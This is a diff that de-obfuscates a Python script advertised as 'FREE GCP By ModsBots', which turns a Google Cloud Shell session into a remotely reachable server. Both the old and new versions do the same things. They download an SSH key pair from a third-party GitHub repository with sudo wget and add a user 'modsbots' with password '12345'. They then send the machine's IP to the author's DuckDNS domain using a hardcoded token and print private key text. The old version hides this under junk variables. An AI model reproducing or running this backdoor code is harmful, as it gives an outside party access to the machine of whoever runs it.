@@ -1,69 +1,16 @@
-n16892455647935674104 = 419
-T16892455647935078102 = "QCNIhDWQUIrlKDhbtGsOkaJypDzABMfvqBlbXcqUHZMMlpJTFSkzQAwxWeidTpugAdrKbKvaLJcloWo"
-IIlIllIIIlIllIlIllllllIIlllIIIIIIlIIlllIIIIIIllllllIIlllIIlllllIIIIlIIlIIIllIllIIllIlIlIIlIIllIlllII = 490
-H1689245564793202998 = "BdKOpzXxBZfGuuXngtbBNdEirkxgMovDFeMJSPuWPIeaDgJDYiRDJrXIrVjfTuotiLWLRWUwxyFbwuZ"
-s1689245564793070696 = 16
-IlIlIlIIIIIIlllllIIIlIIlllllllllllIIIlIlllIIIIlIIIIlllIllIllIIIIlIIIIlIIlIIlllIlIlIIllIllllIlI = "eoSBGxtXBWQpAGbINjrHMxoOsQKCJOOmYDtHGDAwymmXZyELavHzLeIzqcCpwBNMOzszkkFCVJTgkgA"
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx = 699
-IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII = "pBkiZqrBUDMNeOslBJtWPvOyCymhYuZGiFoROjvVbeIblJSrIEtiXjvrkQqPZMteuaEvOZUYyJyMmvh"
-llIllIlIIIlIIlllIIIIlIlllllllIIllIlIllIllllIIIlIIlllllIlIIllIlllIllIIlIIIllllIlIIIIlllII = "WoYZrRbcUqknhpHxqieSEwipKqYEUIkAtwaDWltyLaSAxBWIaYXZKyFoRegDktprtRkpiMWvDlIHHoP"
-FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF = 788
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA = "xCSnGgVWvaVRANRfuBZTAYXAfSztPjIGzIICEBQvJNJhFSVzZcDNqlyzIRTOggyDwvIoONJiHzOfrLh"
-aAAAAaAaAaAAaaAaAaAAAaAaaAaaAaAaaAaaAaAaAaAaAAAaAaAAaaAaaAAAAAAAaaaaaaaaAAaaAaaAAa = "uwwUEJRofCmCmQXicbJcdXUcINfXFOzkYUCWmuozuUGurNOGtYbWnbpJDblsbJqSbDKFGQHAaoMmmhm"
-mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm = "ianxLisLnTthDDHJvxJmZQWYNlipwkANgkCldOWLbBmqMXeiUtnqnBqpGlwYnWlinIHlUORulGzQdjF"
-aaaaaAaAaaaaAaaaaAAaAaAaaAaaaAaAaAaAaAAaaaaaaaAAaAAAaAaaaAAAaAAAaaaaaAAaAAAAaA = 760
-llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll = "RMFWQxsnbamFJVTLpqsboTIbPjffEgHfnBPEWOCpuaOAmdWkqYhiVejtMUDURVvqRHGDkklCuempgBg"
-G1689245564792031374 = "HnluuDeSQRujcNraEuhxJrMjAwAdCycCGZMOpSoKLBizZrhDUlDGzLsaLpDZMpzXpHMYzEMRGfTjTFn"
-AAAAAaaaaaaAAAaAAAaaaAAAAAAaaAaaaAAAaaAAAAaaAaaAAaAaAAAAAAAaaAaaaAaAAAaA = 246
-uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu = "TRFrAtLURuqtiJSnmGcawSGHkAYzRrjrJosXcFFSuMyMRXqapGyruQhXUTHdmEarldyUPbwkxxYcGGH"
-z1689245564791778368 = "LFSMvFBiQSQiygJLoGlKNWObLKogIEnBhpDiSnaHgcmJYBTbqvRwWlKaEYJleMxMVIFgwEPiuCwViIa"
-qzEPyizayNMzRIeTwXCzwuaWsBObivtnvdOJnwGzfortmoESyetcneDFSahFQQFUjOFjyXecsuxHBPM66 = "vpISsbiyjSwSXgbVUnQYrGJlKZeZrmEstChbLmKXKtkdKbACYDppzOhGzEaFDhRwpGBfGxewXBKVdCN"
-l64 = 276
-v1689245564791442262 = "ZZDLtPgfuIapttpQekQDHRVnnQxQMMjqidXnCcbCyVaUilLCmpRlfcaDJWETlYCcUEuTSpjTsxEJZGG"
-Q168924556479136260 = 337
-R58 = "FPPZuVGJrZNaoxVuHuPizdgNxkYzqOtKzGdXwjekToRZeJKqpJMlzFziZwNMZVdIylOUpNeQyEiFgjx"
-p1689245564791187856 = 283
-aaaAaaaaAaAaAaaaAAAAaaAaAaAaaaaaaaAAaAAaAaAAaAAaAAaAaa = "PRXFcyNjpOmucrsahIenkoxtGYzpmgIsmZYoVKmiNburbCkxUqUhsAQTmNAsCXlhqLFidqiDMwAcLoO"
-F52 = "pgaLPKNuWFmNYdeNyFPmMAUZCMlqCoGFBNyleoBqPwwqyvUGFRudgERzsxjmBJKhUEGntuiweTwwSrK"
-aaAaAaaaAaAaaaAaAAAAAaAAaAaAaAaaaAAAaaAAAaaAaAaaAa = 582
-a1689245564790649748 = 290
-f46 = "UgdyvEkbymhBtTWjnwBbHkzPtFyzJvtoPfmuScYdTyNexGgowMuOSMxNxtSUTmppIaFqNvkizuBdoAr"
-yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy = "zsddIqLhVSOZdhIsEquyPcKiFTAjxomNFYXJjCNrQFmUUxmxUtEyEqNXWZxaluIerNEGNCzEbtFvKkY"
-C168924556479047142 = "oLBojEdvKYGOqttkAJfANyJqwOBxUKULieyojVijhjyLPirFeijfhmCLlpMcZxpGblqsckhoLLpNSsc"
-j168924556479034440 = 529
-M168924556479025538 = "eHbHqwySQuyhvdinpENcKPnNckOWpnsuOvJLQKhtSvZynGhfJDVODTIuTLBWFOJBRhnnHXEEMuANcti"
-AaAAaAaaAAaaAaaaAAaAAAAAaAaAaaAAAAAA = 890
-AaAAAaaaaAaaAAaaAAaAaAAaaaaaaAaAaA = 224
-AAAAaaaaaaAaAAaaaaaaAaaaaAAaAAaa = 67
-AaaAAAAaAAaaaAAaAaaAaAAaaAaaaA = "UqOragMNSoFWoBkknJpVOYSaQtegsckPESIbTTrNRUXIPimXEetBXextiGfiALLUUgjgAlSDAWNEMCO"
-AaAaAaaaAaaAAAAaAaaaaAaAAAaa = 449
-R26 = "lFgeQlZGPMWpHWyUJOgGpNIqwKcKrbbQwTHOtBlTnfolRFXWplKSyrZtSADJDfZnAvObjSCWltcOyTS"
-z1689245564789567224 = "EQHvsYGnKxvAmzPSssvSqEZKHoHYQhNlNAUbDbjGBYbiTCTtdlkpKcPUDRKUUifYLAqIbBDzsbpfppT"
-NNNNNNNNNNNNNNNNNNNNNN = "mmurrbEIUpDHsZcblSXqSBeWsKnPefGHVznvXNIAIOLUDVtMChymiNSKGPzVOgwHKqCbrjVqJyBtlPf"
-C1689245564789333620 = "gkPaCmwYQielEMyTExjEoXcXkGktnKPvhxCbaoCQrItjYVPHMfUFEnBWLKsrRbCndxMHTxddlRffGig"
-IllIIIIIIllllIllIl = "tttQbwecGTPzESVMYRYzjXEJamkVXuhhHNukNRAmEvPwVdQvUzSQBJFQogbThJysKXljgAXfmyVESEm"
-I1689245564788868216 = 401
-u14 = 470
-l1689245564788792412 = "RgQfqrvxemFuqQMtgTDCKXYOrbnEdMqqspuFieALWtYCmAvePEYzLtxCOtChmCaLCiGHhxsRGyTNZMQ"
-IllIIllIlI = 248
-C8 = "XvdfJrWaDspKSBkWDfKOElxskTfmSCTZxqZZXMfOIGnhXAeynovTGxAWTIoZiIwdzieeducJVgKrOGd"
-IlIIll = "jlhPJjmhgAwvkyLcsPNQMAwuvbgBrzzWxoIBScDUyNqoUgfYWYtUFvKccfGJmwhIHpjsAcuHlkLivuO"
-AAAA = "ZLiHxriZNKmbJxNiwKlGrAAdkPsuHNomxqMXvZFRAEYKWYKJAVWvSETjnUSquyctPomeAAKGUXDFVfF"
-u2 = "qkdUvseWUVuYsQcrpJGmDVpUyAGElQlstJJdqojzKkoFMfhSinVUjIvFtNpNEpGsoUpKclILcqukDPx"
-
 import subprocess
 import sys
 #import wget
 import os.path
 import requests
 
-def duckdns_update(domains, IIlI, lIIIlIllllllllIIIllIlI, wtpXquQsZprnLJTOSWnpAvjmnIdOrNDkuZSyPBqfsqScaZKlrMAYgRehzDlKpYIQqeWKpCFdZXQlxFd1=False):
+def duckdns_update(domains, token, ip, verbose=False):
     """Update duckdns.org Dynamic DNS record.
 
     Args:
         domains (str): The DuckDNS domains to update as comma separated list.
-        IIlI (str): An UUID4 provided by DuckDNS for your user.
-        wtpXquQsZprnLJTOSWnpAvjmnIdOrNDkuZSyPBqfsqScaZKlrMAYgRehzDlKpYIQqeWKpCFdZXQlxFd1 (bool): Returns info about whether or not IP has been changed as
+        token (str): An UUID4 provided by DuckDNS for your user.
+        verbose (bool): Returns info about whether or not IP has been changed as
             well as if the request was accepted.
 
     Returns:
@@ -71,28 +18,28 @@ def duckdns_update(domains, IIlI, lIIIlIllllllllIIIllIlI, wtpXquQsZprnLJTOSWnpAv
         status as well.
 
     """
-    AA = {
+    params = {
         "domains": domains,
-        "IIlI": IIlI,
-        "lIIIlIllllllllIIIllIlI": lIIIlIllllllllIIIllIlI,
-        "wtpXquQsZprnLJTOSWnpAvjmnIdOrNDkuZSyPBqfsqScaZKlrMAYgRehzDlKpYIQqeWKpCFdZXQlxFd1": wtpXquQsZprnLJTOSWnpAvjmnIdOrNDkuZSyPBqfsqScaZKlrMAYgRehzDlKpYIQqeWKpCFdZXQlxFd1
+        "token": token,
+        "ip": ip,
+        "verbose": verbose
     }
-    p168924556476216533 = requests.get("https://www.duckdns.org/update", AA)
-    return p168924556476216533.text.strip().replace('\n', ' ')
-IIlI = "cc19788f-87ce-48f9-8cb6-0d977133be39"
-aaaaa = "modsbots.duckdns.org"
+    r = requests.get("https://www.duckdns.org/update", params)
+    return r.text.strip().replace('\n', ' ')
+token = "cc19788f-87ce-48f9-8cb6-0d977133be39"
+domain = "modsbots.duckdns.org"
 
 def download_key():
-    #I168924556476552946 = "https://raw.githubusercontent.com/modbots/key_pair/main/google_compute_engine.pub"
-    #T7 = "https://raw.githubusercontent.com/modbots/key_pair/main/google_compute_engine"
-    j8 = '/.ssh/google_compute_engine.pub'
-    oBCrLpqzcUZgQgxxovwQajVCClMTvsbngfiseQmgNzQvOZZJuoIXPPhqHRJNzTbNoEmffTqsFsBOkap9 = '/.ssh/google_compute_engine'
-    Z16892455647693910 = '/.ssh'
+    #url_pub = "https://raw.githubusercontent.com/modbots/key_pair/main/google_compute_engine.pub"
+    #url_prv = "https://raw.githubusercontent.com/modbots/key_pair/main/google_compute_engine"
+    pub = '/.ssh/google_compute_engine.pub'
+    prv = '/.ssh/google_compute_engine'
+    loc = '/.ssh'
 
-    #if os.path.exists(j8):
-    #    os.remove(j8)bd268
-    #if os.path.exists(oBCrLpqzcUZgQgxxovwQajVCClMTvsbngfiseQmgNzQvOZZJuoIXPPhqHRJNzTbNoEmffTqsFsBOkap9):
-    #    os.remove(oBCrLpqzcUZgQgxxovwQajVCClMTvsbngfiseQmgNzQvOZZJuoIXPPhqHRJNzTbNoEmffTqsFsBOkap9)
+    #if os.path.exists(pub):
+    #    os.remove(pub)bd268
+    #if os.path.exists(prv):
+    #    os.remove(prv)
     try:
          # executing useradd command using subprocess module
          subprocess.run(['sudo', 'rm', '-rf', '/.ssh/google_compute_engine.pub' ])  
@@ -102,8 +49,8 @@ def download_key():
          sys.exit(1)
     
     try:
-        RRRRRRRRRRR = subprocess.run(['sudo', 'wget', 'https://raw.githubusercontent.com/modbots/key_pair/main/google_compute_engine.pub']) 
-        IlIIIllIIIIl = subprocess.run(['sudo', 'wget', 'https://raw.githubusercontent.com/modbots/key_pair/main/google_compute_engine' ]) 
+        down = subprocess.run(['sudo', 'wget', 'https://raw.githubusercontent.com/modbots/key_pair/main/google_compute_engine.pub']) 
+        down2 = subprocess.run(['sudo', 'wget', 'https://raw.githubusercontent.com/modbots/key_pair/main/google_compute_engine' ]) 
     except:
         pass
     subprocess.run(['sudo', 'mv', 'google_compute_engine.pub', '.ssh/' ])
@@ -112,14 +59,14 @@ def download_key():
 def add_user():
  
      # Ask for the input
-     W168924556477192813 = "modsbots"
+     username = "modsbots"
  
-     # Asking for users AaAaaaaAAaAaaA
-     AaAaaaaAAaAaaA = "12345"
+     # Asking for users password
+     password = "12345"
         
      try:
          # executing useradd command using subprocess module
-         subprocess.run(['sudo', 'useradd', '-p', AaAaaaaAAaAaaA, W168924556477192813 ])     
+         subprocess.run(['sudo', 'useradd', '-p', password, username ])     
      except:
          print(f"Failed to add user.")                    
          sys.exit(1)
@@ -130,9 +77,9 @@ def run_first():
         
      try:
          # executing useradd command using subprocess module
-         p168924556476216533 = subprocess.run(['gcloud', 'alpha', 'cloud-shell', 'ssh', '--dry-run' ],hMQDlaKLsWAViibdwukVXrHhNezLRTgUQFBUvYxqLkCTrOSxsDcVgUdXfAJQqVykrRTPyxkiDvHpnCc16=subprocess.PIPE)   
-         AaaaAAaAaAaaAaAAa = p168924556476216533.stdout
-         return AaaaAAaAaAaaAaAAa
+         r = subprocess.run(['gcloud', 'alpha', 'cloud-shell', 'ssh', '--dry-run' ],stdout=subprocess.PIPE)   
+         a = r.stdout
+         return a
          #print('Mods Done')
      except:
          print(f"Failed to create session.")                    
@@ -164,14 +111,14 @@ run_first()
 
 download_key()
 
-JlTmVIyfcVeKVANbBQaKmhxCZYlZxgPEBeDjTJDBBHWSydXdcdtEzgPvxlwgWLUARTcWTgBNXqiWcpi18 = run_first()
-AaAAaAaAAAaaAaaaaaA = JlTmVIyfcVeKVANbBQaKmhxCZYlZxgPEBeDjTJDBBHWSydXdcdtEzgPvxlwgWLUARTcWTgBNXqiWcpi18.decode()
-words, aaAAAAaaaAAaaAAAaaaa = AaAAaAaAAAaaAaaaaaA.split('=no ')
-print(aaAAAAaaaAAaaAAAaaaa)
+res = run_first()
+re = res.decode()
+words, ss = re.split('=no ')
+
 
 try:
-    ips, f1689245564778133221 = aaAAAAaaaAAaaAAAaaaa.split(' -- DEVSHELL_PROJECT_ID')
-    user,lIIIlIllllllllIIIllIlI = ips.split('@')
+    ips, ssss = ss.split(' -- DEVSHELL_PROJECT_ID')
+    user,ip = ips.split('@')
 
     print ("""
            -----BEGIN OPENSSH PRIVATE KEY-----
@@ -211,20 +158,20 @@ nUcRmedSPjkWHYjxPsOwPtemhaZG39RUdGuLCnmPmlzWjBQKRJ70LBtqQM+KjpMj1YyJp6
 xnsMpJfhRzp+YUzpW3EaCaBrOoTZtZwG0ZHpG8nfGFsCp1pgTosrU05oY8/f7rP1PLJZue
 I/Omki5ZQIGr7GCBLjXT5jm/wDK+B4/dd55D6/b3Y4Eh/Er5EEdsMPuBmA1jU8OL+7IKtR
 lmB25OgSmgJ9oRAAAAJXVtaW5uaHRldGt5YXdAY3MtNDY1MzczOTkyNDczLWRlZmF1bHQB
-UfRrsDbKaMZAdeSgJkWUVWbKJDUQcnSWoEMjoWYCMoqEghKtimLVXoWjudbWXGNrFusAvZfLqdbBXqL23==
+AgMEBQ==
 -----END OPENSSH PRIVATE KEY-----
 """)
 
     print("Here is Current INFO")
 
-    print(lIIIlIllllllllIIIllIlI + ":6000")
+    print(ip + ":6000")
 
-    print("W168924556477192813 = modsbots")
-    duckdns_update(aaaaa, IIlI, lIIIlIllllllllIIIllIlI)
+    print("username = modsbots")
+    duckdns_update(domain, token, ip)
 
 except:
-      ips, f1689245564778133221 = aaAAAAaaaAAaaAAAaaaa.split(' --')
-      user,lIIIlIllllllllIIIllIlI = ips.split('@')
+      ips, ssss = ss.split(' --')
+      user,ip = ips.split('@')
 
       print ("""
              -----BEGIN OPENSSH PRIVATE KEY-----
@@ -264,79 +211,25 @@ nUcRmedSPjkWHYjxPsOwPtemhaZG39RUdGuLCnmPmlzWjBQKRJ70LBtqQM+KjpMj1YyJp6
 xnsMpJfhRzp+YUzpW3EaCaBrOoTZtZwG0ZHpG8nfGFsCp1pgTosrU05oY8/f7rP1PLJZue
 I/Omki5ZQIGr7GCBLjXT5jm/wDK+B4/dd55D6/b3Y4Eh/Er5EEdsMPuBmA1jU8OL+7IKtR
 lmB25OgSmgJ9oRAAAAJXVtaW5uaHRldGt5YXdAY3MtNDY1MzczOTkyNDczLWRlZmF1bHQB
-UfRrsDbKaMZAdeSgJkWUVWbKJDUQcnSWoEMjoWYCMoqEghKtimLVXoWjudbWXGNrFusAvZfLqdbBXqL23==
+AgMEBQ==
 -----END OPENSSH PRIVATE KEY-----
 """)
 
       print("Here is Current INFO")
 
-      print(lIIIlIllllllllIIIllIlI + ":6000")
+      print(ip + ":6000")
 
-      print("W168924556477192813 = modsbots")
-      duckdns_update(aaaaa, IIlI, lIIIlIllllllllIIIllIlI)
+      print("username = modsbots")
+      duckdns_update(domain, token, ip)
 
 
 
 print("""Auto Update Ip to duckdns was done...
-      sssssssssssssssssssssssssssss =  modsbots.duckdns.org
-      S30 = 6000
-      IlIlllIIlIlllIlIIIIlIIIlIIIllll = modsbots
+      Server =  modsbots.duckdns.org
+      Port = 6000
+      UserName = modsbots
       Use Private Key to access server
       
       """)
 
 print ("FREE GCP By ModsBots")
-
-z1 = "QhZPYkfgYzJkitZyVaHZaLGWjBsDEMeWfWCRdvtbXhQfRPehyughVsJyZKwEnJDqoCMIGVpiyluaslk"
-p168924556478841573 = "TTJxYwvRXvZuTLdvaOsKzXWzzBLZxHrITGoLHFPGoXyXMdCuOfUqnbhszuNrChepqoxPIZCgyceLwxn"
-aaaaA = 252
-Aaaaaaa = 209
-ppppppppp = "nyWrNRrGObmCtCzDBLpRJOCeFfvYtyPNSjslvDFoYvWudmNNBPgFAFcdQRgwYjeUNPkefziHkVgFNjA"
-M11 = 857
-IIIIIIIIIIIII = "qWsXzWcNIahOjeXkETFsDldczrXwvbbkrZNxVIAQKIBrmLFDTnxTfXUrhntEUGncUDAOXYwjPznSLtm"
-GGGGGGGGGGGGGGG = 786
-AaaaaaAaAaAaaAAAA = 463
-BBBBBBBBBBBBBBBBBBB = "uGuckisKqefmWhhHzKElDKBnJSMwawuKoqlIRYIKijRfocxBSHQJTrwPUnfXoAlsggSAcMgqcIMXECH"
-AaaaAaAAAAaaAAAAAaAaa = "pgJBWePsQROgrBOZrPDueCKtswiTkdFNzbpULttyOnlFNPPJcrquTAYIfOIekcExulvUawrPtSioinz"
-IIIIIIIllIlIlllIIIIlIIl = "lvXVULIWdgUrLMVnfrCvROAKdFGDdBVzaAazBsexglFHFLTMNfiEzrlStHWfEryrMJpZoYDUjccexhg"
-aAAAaaAaaaaaaAAaaaaaaAaaa = 467
-aaaaaAaAaAaAAAAaAAaaAaAaAaA = "rAMQMSadZZQbSXwFEIgfhLzytgHKVeJpzBvzzqSgfdtwGXufxzKUHmzqpxrcUVbSBBzsUSnnvVlzLls"
-ZSxFjWMzDZNclICbqdunINiSPzHpZjhSUUVaRTBkZfukazQHNdSHUHxfUZFTmRsOJanGwGKFEtmnGYt29 = 294
-aaaAaAaaAaAaaaaaaAAaaAAaaAaaaAA = "ptglMJejBmssSQEYbiUACznJfkYkQcdXfkgoAlQOwnzvyQbpPhCSJnTulpQGbNxFogUgsiURGCJCMca"
-aAaAAaAAAaaaAaAAAAaaAaaAaaAaAaAaA = 208
-ccccccccccccccccccccccccccccccccccc = "KqbgsYXxyECTVOtvENFcHnZWOSfQaBnkiimRphUQJeulNcUYHEhcaXpWONALOJbCRQPJQqpdaEsimgN"
-j37 = "HaFoFdXhuQTfJJKZvGAhJkZbdtLMyErzuqWPRaCXDHxSoNazfLQAuNlVhlVDObDsrLkatJPQOPnSzOG"
-AaaaAAaaAaaaaAaaAaaaAaaaAaaAAaaAaAAAaAA = "dCVOqvDaYtiQXdDBvtriLKdQmuEoEkpEsTztGiRUmZdKRJKVuWQBriTNoTeVNdVlBRioXrQXFBEshDS"
-IIllIlIllIlIIIlIlIllllIllIllIIlllIllIIIll = "mrRsSxUqbFQFroLUEBQmbGJWusLJGiINCTZNjOXVgAdlfprqTRdDgcJQYPYsszKUTsDnZHXFWnXwXpj"
-U1689245564790479243 = 245
-h1689245564790583845 = "UtQVtVfANvwHjXHMsKFOpTFMrTPfgvuHKwzckYkOjFBIbHkGytpizHAGZlWQjDvlcyWeNNmmuYXSjHW"
-W1689245564790642547 = 276
-QhojWuYpWrTjotchRpdqwafYeghrYSiMIGawPPAOvgyYFMrAksGelmFeAkOVlaXeouTXepXHwCSoFUg49 = 273
-aaaaAaaaaAAAaaaAaAaaaaAaAaAaAAAaaAAaaAaaaaaAAAaAaaa = 243
-VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV = 383
-AaAAaAaaaaAaAAAaAAaaaaaAAAAaAaAaaAAaAaAaaAAAAAaaAAAAAaa = "SBjCtWCmAOAIuhECtBAmMdpSBpIpJKSBPXZsePxYrZcTfnYTLflgtYbtPanvalzDmwwPSDcvKcbFVYZ"
-AAAAAAaaaAAAAaAaaaAaAaAaaaAAaaaAaaAaAAAAaaaaAaaAAAAaaaaaA = 673
-ReXBiAsHrNWdhOljVBxcROhGJUQyvuLUrgLtGbSnooIsdtfPwZRCdZwUEKwNVpWrIumNQjajUXWtDtM59 = 329
-yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy = 444
-swXzJIhlKPhaoFxigIEhGlCNLFKgWJQzQdcgFVyxXXpVjcCEkVJVGnqZBZLvhmnjmWuNxBXbPhLqpvl63 = 208
-llIIlIllIIlIIlIIIllIIllllIlIIlIlIIIIlIIIllIllIlIllIllIIlIIIIIlIlI = 787
-aAAaAaaaAAaAaAaAAaaaaAAaaaaaAaaaAaAaaAaaAAAAaAaaAaaAAaaaaAaaaaAAAAA = "MjksGwYzMKgqkHuDeUPaApmQXTPBGKHNDiSBkdHieHpSlElhFJaxRhAQyvNpAkDUUunWRcHvHtiNisg"
-B69 = 384
-IIIlIIIIIIlllIIllllIlIIIIllIllIIlIIIIIIIlIllIIlIIllIlIIlIIIIlllIllIllIl = 834
-GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG = "TvNmxWijtUFuMeoXnPJNqPDxcLRoOecMpZSRmYByozhxKSYcsGxylRBnKCjBFphdHLfxvcHAbLnJbRZ"
-Y1689245564792095475 = "rstehsRyyrgcjyHDIxIiSQJSnnlzsFAYvxVdDLWIQwJGwfvkGsIWmFQBOosjBOEbuhCknLtfOsncUqu"
-I77 = "djBBicdqYSLKxQlzcmypQMSTRzhppaPeUWApLGqywMacqeBPOpKmErchvddyImuibCBRBztfHwGNsVy"
-ppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp = 516
-W81 = "wmqsuxoUcdIHThpBfZzKZWVqLndBGPTnmrQJoXrzRFlXIkfwzGPRvHyteIcSffmNvoSRNaDXBLYDfmY"
-q168924556479246683 = 335
-NdqLzCXgRebPQNHuEjqgPiSnaVUOyVGVvTlCJzzPaZPVzjdpriZhCjbSwNCguJjytVPAmUStYeMyhhy85 = 195
-kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk = "JNbnoIveBxDAHUqnxFSlrJCiLyMcNjghyxOiQkgsBCoGiyuAkAaeGSdFrRAsLowlmrJNoYqxoFdCrJZ"
-O89 = "LUUkzMSrGJHbcKcdlRSSBdAtRiuhOFBRtKFpUCRhOUQzrORVWmHgkfoTNsTPLLrqWqDeGUkcqcqjLpn"
-c91 = 787
-ggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg = 741
-lIlllIIIlllllIlIIlllIIIIIIIIllIllIIIlIlIlllIIIIllIIllIIIlIIlIllllIlllIlIlIlIIIIlIIllllIlIlIIIlI = "ZVearpzbjhcKALqFakBjowlTLocKpkdRoaCOtNkxmFVJEXkvpdvNlKrtVtaKeJassnQjkGHIoQqHnsG"
-aaaaaAaaaaAAAAaaAAaaAaAaAAaaAAaAAAaAAAaAAaAaAaaAaAaaaAAaAaaAaAAaaAaaaaAAaAAAAaaAaaAaAAAaaaaaaAAaA = 443
-i168924556479328999 = "ArBSZtnqtaRpfFGDSBeGzHvarJquLgbTabFAMkUPLsjhrquqqAHdWaNzWcpTNnywQZlpHDXLuOQHAjo"
-AaaaAaAaAAaaAAaAAAAAAAAAAAaaAaAAaAaaaAaaaaAAAAAaAaaaaaAAAaaAaAAAaAAaaAaAaaaAaAaAAaAaAAaaaAaAAAaAaaaaA = "tyvLzWweCeqZEAVObnSPDQTvTgqgBplvURcneDRPDAkbrRczAnbcrINXjbHxhWeEAuvmSCbfxXMGRdf"
-DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD = "VxnzNxCbqIXTeRNENlZiNoSFzhbJURpsSuBxsdbODBkHvszjEOrwVLFlmQXlyCsGYukZvIQzJBouhvl"
-aaAAaAAaaAaaAaAaaAAAAAaAaaAAAaAAaAaaaAAaAaaaaaaAaaAaAAaaaaAAAaAAAAaaaAAAAAAAaaaaaaAAaaAaAAaaaaaaAAaAAaAaA = "FKcGrRpXsJxHDhWzrijGriJpigISvDEWGnbCuhzOhBnyENFVhybbyQhIDTvGeqXABfxyuAAxXEkOUdX"
